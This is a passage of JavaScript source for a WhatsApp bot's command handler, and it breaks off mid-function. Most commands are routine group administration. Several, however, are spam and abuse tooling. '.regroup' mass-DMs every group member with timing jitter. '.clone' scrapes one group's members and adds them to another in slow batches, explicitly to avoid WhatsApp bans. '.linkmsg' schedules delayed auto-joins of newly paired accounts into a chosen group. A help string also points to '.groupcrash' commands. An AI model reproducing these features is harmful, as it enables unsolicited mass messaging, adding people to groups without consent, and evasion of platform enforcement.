                    return reply(`✅ Jitter set to ±${n}s.`);
                }
                if (sub === "skipadmins") {
                    if (!["on", "off"].includes(rest.toLowerCase())) return reply("Usage: .regroup skipadmins on/off");
                    cfg.skipAdmins = rest.toLowerCase() === "on"; saveRegroup(cfg);
                    return reply(`✅ Skip admins: ${cfg.skipAdmins ? "ON" : "OFF"}.`);
                }
                if (sub === "stop") {
                    if (!cfg.active) return reply("ℹ️ No active regroup job.");
                    cfg.active.cancelled = true; saveRegroup(cfg);
                    return reply("🛑 Regroup will stop after the current message.");
                }
                if (sub === "status") {
                    if (!cfg.active) return reply("ℹ️ No active regroup job.");
                    return reply(`📊 In group ${cfg.active.group}\nSent: ${cfg.active.sent}/${cfg.active.total}\nFailed: ${cfg.active.failed || 0}`);
                }
                if (sub === "start") {
                    if (!isGroup) return reply("Run this from the source group you want to migrate.");
                    if (!cfg.groupLink) return reply("❌ Set a destination link first: *.regroup link <invite>*");
                    if (cfg.active) return reply("⚠️ A regroup job is already running. Use *.regroup stop* first.");
                    const meta = await sock.groupMetadata(from);
                    const adminSet = new Set(meta.participants.filter(p => p.admin).map(p => p.id));
                    const ownNum = (sock.user?.id || "").split(":")[0].split("@")[0];
                    const targets = meta.participants
                        .map(p => p.id)
                        .filter(j => j.split("@")[0] !== ownNum)
                        .filter(j => !cfg.skipAdmins || !adminSet.has(j));
                    if (!targets.length) return reply("ℹ️ No eligible members to message.");
                    cfg.active = { group: from, total: targets.length, sent: 0, failed: 0, cancelled: false, startedAt: Date.now() };
                    saveRegroup(cfg);
                    await reply(`🚀 Regroup started → DMing ${targets.length} member(s).\nPace: ${cfg.perMessageDelaySeconds}s ±${cfg.jitterSeconds}s.\nTrack with *.regroup status*.`);
                    (async () => {
                        for (let i = 0; i < targets.length; i++) {
                            const cur = loadRegroup();
                            if (!cur.active || cur.active.cancelled) break;
                            const jid = targets[i];
                            const body = (cur.text || "").replace(/\{LINK\}/g, cur.groupLink || "");
                            try {
                                await sock.sendMessage(jid, { text: body });
                                cur.active.sent = (cur.active.sent || 0) + 1;
                            } catch (e) {
                                cur.active.failed = (cur.active.failed || 0) + 1;
                                console.log(`[regroup] fail ${jid}: ${e?.message}`);
                            }
                            saveRegroup(cur);
                            const baseMs = cur.perMessageDelaySeconds * 1000;
                            const jit = cur.jitterSeconds > 0 ? Math.floor((Math.random() * 2 - 1) * cur.jitterSeconds * 1000) : 0;
                            await new Promise(r => setTimeout(r, Math.max(1500, baseMs + jit)));
                        }
                        const fin = loadRegroup();
                        const wasCancelled = fin.active?.cancelled;
                        try {
                            await sock.sendMessage(from, { text: `${wasCancelled ? "🛑 *Regroup cancelled.*" : "✅ *Regroup complete.*"}\nSent: ${fin.active?.sent || 0} • Failed: ${fin.active?.failed || 0} / ${fin.active?.total || 0}` });
                        } catch {}
                        fin.active = null; saveRegroup(fin);
                    })();
                    return;
                }
                return reply("Unknown option. Send *.regroup* to see all options.");
            }

            // --- LINK WELCOME / AUTO-JOIN ---
            case ".linkmsg": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const sub = (parts[1] || "").toLowerCase();
                const rest = parts.slice(2).join(" ").trim();
                const cfg = loadLinkWelcome();

                // Helper: parse "7h", "30m", "45" (defaults to minutes)
                function parseDur(s, unit) {
                    if (!s) return null;
                    const m = String(s).match(/^(\d+(?:\.\d+)?)\s*(h|m|s)?$/i);
                    if (!m) return null;
                    const n = parseFloat(m[1]);
                    const u = (m[2] || unit).toLowerCase();
                    if (u === "h") return n;          // hours
                    if (u === "m") return n / 60;     // minutes -> hours
                    if (u === "s") return n / 3600;
                    return n;
                }

                if (!sub || sub === "show" || sub === "view") {
                    const pending = loadPendingJoins();
                    return reply(
                        `📬 *Auto-Welcome / Auto-Join*\n━━━━━━━━━━━━━━━━━━━━\n` +
                        `Status:      ${cfg.enabled ? "🟢 ON" : "🔴 OFF"}\n` +
                        `Auto-join:   ${cfg.autoJoin ? "✅ yes" : "❌ no"}\n` +
                        `Delay:       ${cfg.delayHours}h\n` +
                        `Jitter:      ±${cfg.jitterMinutes}m\n` +
                        `Group link:  ${cfg.groupLink || "_(not set)_"}\n` +
                        `Invite code: ${extractInviteCode(cfg.groupLink) || "_(none)_"}\n` +
                        `In-flight:   ${pending.length} pending\n\n` +
                        `*Welcome preview:*\n${cfg.text}${cfg.groupLink ? `\n\n🔗 ${cfg.groupLink}` : ""}\n\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n*Commands:*\n` +
                        `• *.linkmsg on / off* — enable / disable\n` +
                        `• *.linkmsg set <text>* — welcome text\n` +
                        `• *.linkmsg group <link>* — community group link\n` +
                        `• *.linkmsg clear* — remove group link\n` +
                        `• *.linkmsg delay <e.g. 7h, 90m>* — wait before action\n` +
                        `• *.linkmsg jitter <e.g. 30m>* — random ± window\n` +
                        `• *.linkmsg autojoin on/off* — actually join the group\n` +
                        `• *.linkmsg test* — DM yourself now\n` +
                        `• *.linkmsg testjoin* — try the group join now\n` +
                        `• *.linkmsg pending* — list scheduled joins\n` +
                        `• *.linkmsg cancel* — cancel scheduled joins`
                    );
                }
                if (sub === "on" || sub === "enable") {
                    cfg.enabled = true; saveLinkWelcome(cfg);
                    return reply(`✅ *ON.* New pairings will be DM'd & ${cfg.autoJoin ? "auto-joined" : "notified"} after ${cfg.delayHours}h ±${cfg.jitterMinutes}m.`);
                }
                if (sub === "off" || sub === "disable") {
                    cfg.enabled = false; saveLinkWelcome(cfg);
                    return reply("🔴 *OFF.* New pairings will not be welcomed or auto-joined.");
                }
                if (sub === "set" || sub === "text") {
                    if (!rest) return reply("Usage: .linkmsg set <welcome text>");
                    cfg.text = rest; saveLinkWelcome(cfg);
                    return reply(`✅ Welcome text updated.\n\nPreview:\n${rest}`);
                }
                if (sub === "group" || sub === "link") {
                    if (!rest) return reply("Usage: .linkmsg group <https://chat.whatsapp.com/CODE>");
                    if (!extractInviteCode(rest)) return reply("❌ That doesn't look like a valid WhatsApp group invite link.");
                    cfg.groupLink = rest; saveLinkWelcome(cfg);
                    return reply(`✅ Group link saved.\n🔗 ${rest}\nInvite code: ${extractInviteCode(rest)}`);
                }
                if (sub === "clear" || sub === "remove") {
                    cfg.groupLink = ""; saveLinkWelcome(cfg);
                    return reply("✅ Group link cleared.");
                }
                if (sub === "delay") {
                    const h = parseDur(rest, "h");
                    if (h === null || h < 0 || h > 168) return reply("Usage: .linkmsg delay <duration>\nExamples: 7h, 90m, 30s, 0 (instant). Max 168h.");
                    cfg.delayHours = h; saveLinkWelcome(cfg);
                    return reply(`✅ Delay set to *${h}h* (${Math.round(h*60)}m).`);
                }
                if (sub === "jitter") {
                    const h = parseDur(rest, "m");
                    if (h === null || h < 0 || h > 12) return reply("Usage: .linkmsg jitter <duration>\nExamples: 30m, 1h, 0 (no jitter).");
                    cfg.jitterMinutes = Math.round(h * 60); saveLinkWelcome(cfg);
                    return reply(`✅ Jitter set to *±${cfg.jitterMinutes}m*.`);
                }
                if (sub === "autojoin") {
                    const v = (rest || "").toLowerCase();
                    if (!["on", "off"].includes(v)) return reply("Usage: .linkmsg autojoin on/off");
                    cfg.autoJoin = v === "on"; saveLinkWelcome(cfg);
                    return reply(`✅ Auto-join is now *${cfg.autoJoin ? "ON" : "OFF"}*.`);
                }
                if (sub === "test") {
                    const preview = buildLinkWelcomeMessage();
                    if (!preview) return reply("⚠️ Currently OFF. Run *.linkmsg on* first.");
                    try { await sock.sendMessage(senderJid, { text: preview }); return reply("✅ Test welcome DM sent."); }
                    catch (e) { return reply(`❌ ${e?.message}`); }
                }
                if (sub === "testjoin") {
                    const code = extractInviteCode(cfg.groupLink);
                    if (!code) return reply("❌ No group link configured.");
                    try { await sock.groupAcceptInvite(code); return reply("✅ Joined (or already a member)."); }
                    catch (e) { return reply(`❌ Join failed: ${e?.message}`); }
                }
                if (sub === "pending" || sub === "queue") {
                    const list = loadPendingJoins();
                    if (!list.length) return reply("📭 No pending joins.");
                    const now = Date.now();
                    let out = `⏳ *Pending Auto-Joins (${list.length})*\n━━━━━━━━━━━━━━\n`;
                    list.forEach(e => {
                        const min = Math.round((e.fireAt - now) / 60000);
                        out += `• user ${e.userId} → in ${min}m\n`;
                    });
                    return reply(out);
                }
                if (sub === "cancel") {
                    const list = loadPendingJoins();
                    savePendingJoins([]);
                    return reply(`🗑️ Cleared ${list.length} pending join(s). (Existing timers will no-op.)`);
                }
                return reply("Unknown option. Send *.linkmsg* to see all options.");
            }

            // --- SILENCENUMBER — dev silences a number from a specific linked bot ---
            case ".silencenumber":
            case ".silence": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const snNum = (parts[1] || "").replace(/\D/g, "");
                if (!snNum) return reply(
                    `🔇 *Silence Number*\n\n` +
                    `Usage: *.silencenumber <number>*\n` +
                    `Example: *.silencenumber 2348012345678*\n\n` +
                    `_The bot linked to this WhatsApp will completely ignore that number._\n` +
                    `_Other bots are not affected._`
                );
                addSilenced(botJid, snNum);
                return reply(`🔇 *+${snNum}* has been silenced on this bot.\nThey will send commands but this bot will not respond to them at all.`);
            }
            case ".unsilencenumber":
            case ".unsilence": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const unsnNum = (parts[1] || "").replace(/\D/g, "");
                if (!unsnNum) return reply("Usage: .unsilencenumber <number>");
                removeSilenced(botJid, unsnNum);
                return reply(`🔊 *+${unsnNum}* has been unsilenced. This bot will respond to them again.`);
            }
            case ".silencelist": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const sl = loadSilenced();
                const slList = sl[botJid || "global"] || [];
                if (!slList.length) return reply("🔊 No numbers are currently silenced on this bot.");
                return reply(`🔇 *Silenced Numbers (this bot)*\n━━━━━━━━━━━━━━━━━━━━\n\n${slList.map(n => `  • +${n}`).join("\n")}\n\n_Use .unsilencenumber <number> to restore._`);
            }

            case ".numinfo":
            case ".numberinfo":
            case ".targetloc":
            case ".targetlocation":
            case ".locate": {
                const input = parts[1] || (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || "").split("@")[0];
                const info = lookupPhoneNumberInfo(input);
                if (!info) return reply("Usage: .numinfo 2348012345678\n\nThis shows country/prefix info only, not live GPS location.");
                await reply(
                    `📍 *Number Info*\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `• Number: *${info.international}*\n` +
                    `• Country: *${info.countryName}* (${info.countryCode})\n` +
                    `• Calling code: *+${info.callingCode}*\n` +
                    `• Local prefix: *${info.localPrefix}*\n` +
                    `• Carrier guess: *${info.carrier}*\n\n` +
                    `_Note: this is based on phone prefix/public numbering data. It cannot show live/real GPS location._`
                );
                break;
            }

            // --- GROUP ADMIN COMMANDS ---
            case ".add": {
                if (!isGroup) return reply("This command only works in groups.");
                const num = parts[1];
                if (!num) return reply("Usage: .add 234xxxxxxxxxx");
                const jid = num.replace(/\D/g, "") + "@s.whatsapp.net";
                await sock.groupParticipantsUpdate(from, [jid], "add");
                await reply(`✅ Added ${num} to the group.`);
                break;
            }

            case ".kick": {
                if (!isGroup) return reply("This command only works in groups.");
                const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (!mentioned.length) return reply("Tag the person to kick. Usage: .kick @user");
                await sock.groupParticipantsUpdate(from, mentioned, "remove");
                await reply("✅ Member removed.");
                break;
            }

            case ".promote": {
                if (!isGroup) return reply("This command only works in groups.");
                const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (!mentioned.length) return reply("Tag the person. Usage: .promote @user");
                await sock.groupParticipantsUpdate(from, mentioned, "promote");
                await reply("✅ Promoted to admin.");
                break;
            }

            case ".demote": {
                if (!isGroup) return reply("This command only works in groups.");
                const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (!mentioned.length) return reply("Tag the person. Usage: .demote @user");
                await sock.groupParticipantsUpdate(from, mentioned, "demote");
                await reply("✅ Admin privileges removed.");
                break;
            }

            case ".link": {
                if (!isGroup) return reply("This command only works in groups.");
                const inv = await sock.groupInviteCode(from);
                // Save invite code for auto-rejoin if bot gets kicked
                savedGroupLinks[from] = inv;
                try {
                    const meta = await sock.groupMetadata(from);
                    groupNames[from] = meta.subject;
                } catch (_) {}
                await reply(`🔗 Group Link:\nhttps://chat.whatsapp.com/${inv}`);
                break;
            }

            case ".revoke": {
                if (!isGroup) return reply("This command only works in groups.");
                await sock.groupRevokeInvite(from);
                await reply("🔄 Group link has been reset.");
                break;
            }

            case ".mute": {
                if (!isGroup) return reply("This command only works in groups.");
                await sock.groupSettingUpdate(from, "announcement");
                await reply("🔇 Group muted. Only admins can send messages now.");
                break;
            }

            case ".unmute": {
                if (!isGroup) return reply("This command only works in groups.");
                await sock.groupSettingUpdate(from, "not_announcement");
                await reply("🔊 Group unmuted. Everyone can send messages.");
                break;
            }

            // --- PROTECTION TOGGLES ---
            case ".antilink": {
                if (!isGroup) return reply("This command only works in groups.");
                const r = await getGroupRoles(sock, from);
                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply("❌ Group admins only.");
                const val = parts[1]?.toLowerCase();
                if (!["on", "off"].includes(val)) return reply("Usage: .antilink on/off");
                setGroupSetting(from, "antilink", val === "on");
                if (val === "on" && !r.botIsAdmin) await reply("⚠️ Note: I'm not admin here, so I can't actually delete or kick. Please make me admin.");
                await reply(`🔗 Anti-link is now *${val.toUpperCase()}* in this group.`);
                break;
            }

            case ".antispam": {
                if (!isGroup) return reply("This command only works in groups.");
                const r = await getGroupRoles(sock, from);
                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply("❌ Group admins only.");
                const val = parts[1]?.toLowerCase();
                if (!["on", "off"].includes(val)) return reply("Usage: .antispam on/off");
                setGroupSetting(from, "antispam", val === "on");
                if (val === "on" && !r.botIsAdmin) await reply("⚠️ Note: I'm not admin here, so enforcement won't fire. Please make me admin.");
                await reply(`🚫 Anti-spam is now *${val.toUpperCase()}* in this group.`);
                break;
            }

            case ".antimention": {
                if (!isGroup) return reply("This command only works in groups.");
                const r = await getGroupRoles(sock, from);
                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply("❌ Group admins only.");
                const val = parts[1]?.toLowerCase();
                if (!["on", "off"].includes(val)) return reply("Usage: .antimention on/off\n(Triggers on 5+ mentions in one message; 3-strike → kick.)");
                setGroupSetting(from, "antimention", val === "on");
                if (val === "on" && !r.botIsAdmin) await reply("⚠️ Note: I'm not admin here, so enforcement won't fire.");
                await reply(`📢 Anti-mention is now *${val.toUpperCase()}* in this group.`);
                break;
            }

            case ".antidemote": {
                if (!isGroup) return reply("This command only works in groups.");
                const r = await getGroupRoles(sock, from);
                if (!msg.key.fromMe && !isDevJid(senderJid) && !r.admins.has(senderJid)) return reply("❌ Group admins only.");
                const val = parts[1]?.toLowerCase();
                if (!["on", "off"].includes(val)) return reply("Usage: .antidemote on/off");
                setGroupSetting(from, "antidemote", val === "on");
                if (val === "on" && !r.botIsAdmin) await reply("⚠️ Note: I'm not admin here, so I can't auto-repromote.");
                await reply(`🛡️ Anti-demote is now *${val.toUpperCase()}* in this group.`);
                break;
            }

            case ".antibug":
            case ".bugshield": {
                if (!msg.key.fromMe && !isSelfChat) return reply("❌ Owner only.");
                const val = parts[1]?.toLowerCase();
                const current = getBotSecurity(botJid, "antibug");
                if (!val || val === "status") {
                    return reply(
                        `🛡️ *Shield Status: ${current ? "✅ ACTIVE" : "❌ INACTIVE"}*\n\n` +
                        `Usage:\n` +
                        `• *.antibug on* — activate protection\n` +
                        `• *.antibug off* — deactivate\n` +
                        `• *.antibug status* — check state`
                    );
                }
                if (!["on", "off"].includes(val)) return reply("Usage: .antibug on/off/status");
                setBotSecurity(botJid, "antibug", val === "on");
                await reply(`🛡️ Shield is now *${val === "on" ? "✅ ACTIVE" : "❌ INACTIVE"}*.`);
                break;
            }

            case ".welcome": {
                if (!isGroup) return reply("This command only works in groups.");
                const val = parts[1]?.toLowerCase();
                if (!["on", "off"].includes(val)) return reply("Usage: .welcome on/off");
                setGroupSetting(from, "welcome", val === "on");
                await reply(`📣 Welcome messages are now *${val.toUpperCase()}*.`);
                break;
            }

            case ".goodbye": {
                if (!isGroup) return reply("This command only works in groups.");
                const val = parts[1]?.toLowerCase();
                if (!["on", "off"].includes(val)) return reply("Usage: .goodbye on/off");
                setGroupSetting(from, "goodbye", val === "on");
                await reply(`👋 Goodbye messages are now *${val.toUpperCase()}*.`);
                break;
            }

            // --- GC CLONE ---
            case ".clone": {
                // Usage: .clone <source-link-or-id> <dest-link-or-id> <per-batch> <interval-mins>
                const sourceInput = parts[1];
                const destInput = parts[2];
                const batchSize = parseInt(parts[3]) || 1;
                const intervalMins = parseInt(parts[4]) || 10;

                if (!sourceInput || !destInput) {
                    return reply(
                        `❓ *How to use .clone:*\n\n` +
                        `*.clone* <source> <dest> <per-batch> <every-X-mins>\n\n` +
                        `*Source/Dest can be:*\n` +
                        `• A group invite link (chat.whatsapp.com/...)\n` +
                        `• A group ID (from *.groupid* command)\n\n` +
                        `*Examples:*\n` +
                        `• _.clone link1 link2 1 10_ — 1 person every 10 mins\n` +
                        `• _.clone 123@g.us 456@g.us 2 5_ — 2 people every 5 mins\n\n` +
                        `✅ You can start this command from self-chat or any group.\n` +
                        `⚠️ Source members only show if the linked WhatsApp account can access that source group.\n\n` +
                        `_Tip: Keep it slow to avoid WhatsApp banning the group._`
                    );
                }

                if (cloneJobs[from]) {
                    return reply("⚠️ A clone job is already running.\n\nUse *.stopclone* to stop it first.");
                }

                if (batchSize < 1 || batchSize > 10) return reply("❌ Batch size must be between 1 and 10.");
                if (intervalMins < 1 || intervalMins > 60) return reply("❌ Interval must be between 1 and 60 minutes.");

                await reply("⏳ Fetching members from source group...");

                try {
                    // Resolve source (link or group ID)
                    let sourceInfo, members;
                    if (sourceInput.endsWith("@g.us")) {
                        try {
                            sourceInfo = await sock.groupMetadata(sourceInput);
                            members = (sourceInfo.participants || []).map(p => p.id);
                        } catch (e) {
                            return reply(`❌ Could not read source group.\n\nMake sure the linked WhatsApp number is a member of that group.\n\nReason: ${e?.message || "unknown"}`);
                        }
                    } else {
                        const sourceCode = sourceInput.split("chat.whatsapp.com/")[1]?.split(/[?# ]/)[0]?.trim();
                        if (!sourceCode) return reply("❌ Invalid source link. It must look like: https://chat.whatsapp.com/XXXX");
                        let inviteInfo;
                        try {
                            inviteInfo = await sock.groupGetInviteInfo(sourceCode);
                        } catch (e) {
                            return reply(`❌ Could not read the source invite link.\n\nThe link may be expired or invalid.\n\nTip: Use the group ID instead — run *.groupid* inside the source group and use that.\n\nReason: ${e?.message || "unknown"}`);
                        }
                        // Try to get members from the group (only works if bot is already in it)
                        try {
                            sourceInfo = await sock.groupMetadata(inviteInfo.id);
                            members = (sourceInfo.participants || []).map(p => p.id);
                        } catch {
                            return reply("❌ Got the group info but can't read its members.\n\nWhatsApp only shares the member list with accounts that are *already inside* the group.\n\n✅ Fix: Join the group with your linked number first, then use its Group ID (*.groupid* command) instead of the link.");
                        }
                    }

                    if (!members.length) {
                        return reply("❌ No members found in the source group.\n\nThe linked WhatsApp account must be *inside* the source group to read its members. Use *.groupid* inside the group to get the ID, then try again.");
                    }

                    // Resolve destination (link or group ID)
                    let destJid;
                    if (destInput.endsWith("@g.us")) {
                        destJid = destInput;
                    } else {
                        const destCode = destInput.split("chat.whatsapp.com/")[1]?.split(/[?# ]/)[0]?.trim();
                        if (!destCode) return reply("❌ Invalid destination link. It must look like: https://chat.whatsapp.com/XXXX");
                        try {
                            const destInfo = await sock.groupGetInviteInfo(destCode);
                            destJid = destInfo.id;
                        } catch (e) {
                            return reply(`❌ Could not read the destination group link.\n\nThe link may be expired or invalid.\n\nReason: ${e?.message || "unknown"}`);
                        }
                    }

                    if (!destJid) return reply("❌ Could not access the destination group. Make sure the link is valid.");

                    const totalBatches = Math.ceil(members.length / batchSize);
                    const estTime = totalBatches * intervalMins;

                    await reply(
                        `✅ *Clone job started!*\n\n` +
                        `📤 Source: _${sourceInfo.subject}_\n` +
                        `📥 Destination: group ready\n` +
                        `👥 Members found: *${members.length}*\n\n` +
                        `📋 *Clone Plan:*\n` +
                        `• *${batchSize}* person(s) every *${intervalMins} min(s)*\n` +
                        `• Total batches: *${totalBatches}*\n` +
                        `• Est. time: *~${estTime} minutes*\n\n` +
                        `Use *.stopclone* to stop anytime. Starting now... 🚀`
                    );

                    const intervalMs = intervalMins * 60 * 1000;
                    cloneJobs[from] = { intervalId: null, members, total: members.length, index: 0 };

                    const intervalId = setInterval(async () => {
                        const job = cloneJobs[from];
                        if (!job || job.index >= job.total) {
                            clearInterval(intervalId);
                            delete cloneJobs[from];
                            await sock.sendMessage(from, { text: "🎉 *Clone complete!* All members have been added to the destination group." });
                            return;
                        }

                        const batch = job.members.slice(job.index, job.index + batchSize);

                        for (const memberJid of batch) {
                            try {
                                await sock.groupParticipantsUpdate(destJid, [memberJid], "add");
                                await sock.sendMessage(from, {
                                    text: `➕ Added (${job.index + 1}/${job.total}): @${memberJid.split("@")[0]}`,
                                    mentions: [memberJid],
                                });
                            } catch (e) {
                                await sock.sendMessage(from, {
                                    text: `⚠️ Skipped @${memberJid.split("@")[0]}: ${e?.message || "failed"}`,
                                    mentions: [memberJid],
                                });
                            }
                            job.index++;
                        }
                    }, intervalMs);

                    cloneJobs[from].intervalId = intervalId;
                } catch (err) {
                    console.error("Clone error:", err?.message || err);
                    await reply(`❌ Failed to start clone.\n\nCheck that both links/IDs are valid, the linked account can access the source group, and the bot is admin in the destination.\n\nReason: ${err?.message || "unknown error"}`);
                }
                break;
            }

            case ".stopclone": {
                if (!cloneJobs[from]) return reply("⚠️ No active clone job in this chat.");
                clearInterval(cloneJobs[from].intervalId);
                const done = cloneJobs[from].members.filter((_, i) => i < cloneJobs[from].total).length;
                delete cloneJobs[from];
                await reply(`🛑 *Clone stopped.*\n\nJob cancelled successfully.`);
                break;
            }

            // --- HIDETAG (standalone, no text after command) ---
            case ".hidetag": {
                if (!isGroup) return reply("This command only works in groups.");
                try {
                    const meta = await sock.groupMetadata(from);
                    const members = meta.participants.map(p => p.id);
                    // Text after .hidetag on the same line
                    const inlineText = parts.slice(1).join(" ").trim();
                    const invisibleText = inlineText || '\u200e';
                    await sock.sendMessage(from, {
                        text: invisibleText,
                        mentions: members,
                    }, { quoted: msg });
                } catch (e) {
                    await reply(`❌ Failed to hidetag: ${e?.message || "error"}`);
                }
                break;
            }

            // --- TAGALL ---
            case ".tagall": {
                if (!isGroup) return reply("This command only works in groups.");
                try {
                    const meta = await sock.groupMetadata(from);
                    const members = meta.participants.map(p => p.id);
                    const customText = parts.slice(1).join(" ").trim();
                    const tagText = members.map(j => `@${j.split("@")[0]}`).join(" ");
                    const fullText = customText ? `${customText}\n\n${tagText}` : tagText;
                    await sock.sendMessage(from, {
                        text: fullText,
                        mentions: members,
                    }, { quoted: msg });
                } catch (e) {
                    await reply(`❌ Failed to tagall: ${e?.message || "error"}`);
                }
                break;
            }

            case ".tagadmin":
            case ".admins": {
                if (!isGroup) return reply("This command only works in groups.");
                try {
                    const meta = await sock.groupMetadata(from);
                    const admins = meta.participants.filter(p => p.admin).map(p => p.id);
                    if (!admins.length) return reply("No admins found.");
                    const customText = parts.slice(1).join(" ").trim();
                    const tagText = admins.map(j => `@${j.split("@")[0]}`).join(" ");
                    await sock.sendMessage(from, {
                        text: customText ? `👑 *Admins*\n${customText}\n\n${tagText}` : `👑 *Group Admins*\n\n${tagText}`,
                        mentions: admins,
                    }, { quoted: msg });
                } catch (e) {
                    await reply(`❌ Failed to tag admins: ${e?.message || "error"}`);
                }
                break;
            }

            // --- READMORE ---
            // Note: .readmore is also intercepted BEFORE this switch (above) so it works
            // even when .readmore appears mid-sentence like "Everyone send acc .readmore link here"
            case ".readmore": {
                // Reaching here means the user typed only ".readmore" with nothing before/after
                await reply(
                    `❓ *How to use .readmore:*\n\n` +
                    `Put *.readmore* between the visible text and the hidden text.\n\n` +
                    `*Example:*\n` +
                    `_Everyone send acc .readmore Link: wa.me/xxx_\n\n` +
                    `Group members will see *"Everyone send acc"* and tap *Read more* to see the rest.\n\n` +
                    `_You can type it anywhere in the sentence — not just at the start._`
                );
                break;
            }

            // --- GROUP ID / GROUP LIST ---
            case ".groupid": {
                if (isGroup) {
                    const gName = groupNames[from] || "Unknown Group";
                    await reply(`🆔 *Group Name:* ${gName}\n*Group ID:*\n\`${from}\``);
                } else {
                    const knownGroups = Object.entries(groupNames);
                    if (!knownGroups.length) return reply(`📋 No groups cached yet.\n\nRun *.groupid* inside any group first, or wait for the bot to receive a message from a group.`);
                    let listTxt = `📋 *All Known Groups (${knownGroups.length})*\n━━━━━━━━━━━━━━━━━━━\n\n`;
                    knownGroups.forEach(([jid, name], i) => {
                        listTxt += `*${i+1}.* ${name}\n\`${jid}\`\n\n`;
                    });
                    listTxt += `_Use the Group ID above with .groupcrash, .ungroupcrash etc._`;
                    await reply(listTxt);
                }
                break;
            }

            // --- AUTO-REACT ---
            case ".autoreact": {
                if (!isGroup) return reply("This command only works in groups.");
                const val = parts[1]?.toLowerCase();
                const reactData = loadAutoReact();
                if (!val || val === "off") {
                    delete reactData[from];
                    saveAutoReact(reactData);
                    return reply("❌ Auto-react turned *OFF* for this group.");
                }
                if (val === "on" || val === "random") {
                    reactData[from] = "random";
                    saveAutoReact(reactData);
                    return reply("✅ Auto-react turned *ON* for this group. Bot will react with random emojis.");
                }
                // Specific emoji
                reactData[from] = val;
                saveAutoReact(reactData);
                await reply(`✅ Auto-react set to *${val}* for this group.`);
                break;
            }

            // --- AUTO-REPLY ---
            case ".autoreply": {
                const sub = parts[1]?.toLowerCase();
                const replyData = loadAutoReply();
                if (sub === "list") {
                    const entries = Object.entries(replyData);
                    if (!entries.length) return reply("📭 No auto-reply keywords set yet.");
                    const list = entries.map(([k, v]) => `• *${k}* → ${v}`).join("\n");
                    return reply(`📋 *Auto-Reply Keywords:*\n\n${list}`);
                }
                if (sub === "add") {
                    const rest = parts.slice(2).join(" ");
                    const sepIdx = rest.indexOf("|");
                    if (sepIdx === -1) return reply("Usage: .autoreply add <keyword> | <reply text>");
                    const keyword = rest.slice(0, sepIdx).trim().toLowerCase();
                    const replyText = rest.slice(sepIdx + 1).trim();
                    if (!keyword || !replyText) return reply("Usage: .autoreply add <keyword> | <reply text>");
                    replyData[keyword] = replyText;
                    saveAutoReply(replyData);
                    return reply(`✅ Auto-reply added:\n*"${keyword}"* → ${replyText}`);
                }
                if (sub === "remove") {
                    const keyword = parts.slice(2).join(" ").trim().toLowerCase();
                    if (!replyData[keyword]) return reply(`❌ Keyword "*${keyword}*" not found.`);
                    delete replyData[keyword];
                    saveAutoReply(replyData);
                    return reply(`🗑️ Auto-reply for *"${keyword}"* removed.`);
                }
                await reply(
                    `📖 *Auto-Reply Usage:*\n\n` +
                    `• *.autoreply add* <keyword> | <reply> — Add a keyword reply\n` +
                    `• *.autoreply remove* <keyword> — Remove a keyword\n` +
                    `• *.autoreply list* — Show all keywords\n\n` +
                    `_Example:_ .autoreply add hello | Hello there! 👋`
                );
                break;
            }

            // --- SET ALIAS ---
            case ".setalias": {
                if (parts.length < 3) return reply("Usage: .setalias <trigger> <.command>\nExample: .setalias hi .menu");
                const trigger = parts[1].toLowerCase();
                const target = parts[2].toLowerCase();
                const aliasData = loadAliases();
                aliasData[trigger] = target;
                saveAliases(aliasData);
                await reply(`✅ Alias set: *${trigger}* → *${target}*\nNow typing *${trigger}* will run *${target}*.`);
                break;
            }

            case ".delalias": {
                if (!parts[1]) return reply("Usage: .delalias <trigger>");
                const trigger = parts[1].toLowerCase();
                const aliasData = loadAliases();
                if (!aliasData[trigger]) return reply(`❌ Alias *${trigger}* not found.`);
                delete aliasData[trigger];
                saveAliases(aliasData);
                await reply(`🗑️ Alias *${trigger}* deleted.`);
                break;
            }

            case ".aliases": {
                const aliasData = loadAliases();
                const entries = Object.entries(aliasData);
                if (!entries.length) return reply("📭 No aliases set yet.\n\nUse .setalias <trigger> <.command> to add one.");
                const list = entries.map(([k, v]) => `• *${k}* → ${v}`).join("\n");
                await reply(`📋 *Command Aliases:*\n\n${list}`);
                break;
            }

            // --- OCR (extract text from image) ---
            case ".ocr": {
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const quotedType = quoted ? getContentType(quoted) : null;
                if (!quoted || quotedType !== "imageMessage") {
                    return reply("📸 Reply to an image with *.ocr* to extract the text from it.\n\n✍️ Supports printed *and* handwritten text!");
                }
                await reply("🔍 Extracting text from image... (supports handwriting ✍️)");
                try {
                    const fakeMsg = { ...msg, message: quoted };
                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
                    const mimeType = quoted?.imageMessage?.mimetype || "image/jpeg";
                    const text = await ocrFromBuffer(buf, mimeType);
                    if (!text) return reply("❌ No text found in the image.");
                    await reply(`📝 *Extracted Text:*\n\n${text}`);
                } catch (e) {
                    await reply(`❌ OCR failed: ${e?.message || "error"}`);
                }
                break;
            }

            // --- LIST ONLINE / OFFLINE ---
            case ".listonline":
            case ".listoffline": {
                const targetInput = parts[1];
                let targetJid = from;
                if (targetInput) {
                    try { targetJid = await resolveGroupJid(sock, targetInput); } catch (e) {
                        return reply(`❌ ${e.message}`);
                    }
                } else if (!isGroup) {
                    return reply("Usage: .listonline [group link or ID] (or use inside the group)");
                }
                await reply("🔍 Checking presence... this takes ~8 seconds.");
                try {
                    const meta = await sock.groupMetadata(targetJid);
                    const members = meta.participants.map(p => p.id).slice(0, 50);
                    for (const jid of members) {
